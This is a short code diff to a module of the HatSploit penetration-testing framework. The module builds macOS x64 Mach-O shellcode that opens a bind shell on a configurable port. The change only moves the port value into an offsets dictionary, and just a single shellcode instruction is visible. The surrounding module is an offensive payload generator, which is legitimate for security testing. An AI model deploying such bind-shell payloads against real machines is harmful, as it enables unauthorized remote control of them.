@@ -61,6 +61,10 @@ class HatSploitPayload(Payload, HatVenom):
     def run(self):
         bind_port = self.parse_options(self.options)
 
+        offsets = {
+            'bport': bind_port
+        }
+
         self.output_process("Generating shellcode...")
         shellcode = (
             b"\x48\x31\xff"      # xorq  %rdi, %rdi
@@ -116,6 +120,6 @@ class HatSploitPayload(Payload, HatVenom):
         )
 
         self.output_process("Generating payload...")
-        payload = self.generate('macho', 'x64', shellcode, {'bport': bind_port})
+        payload = self.generate('macho', 'x64', shellcode, offsets)
 
         return payload
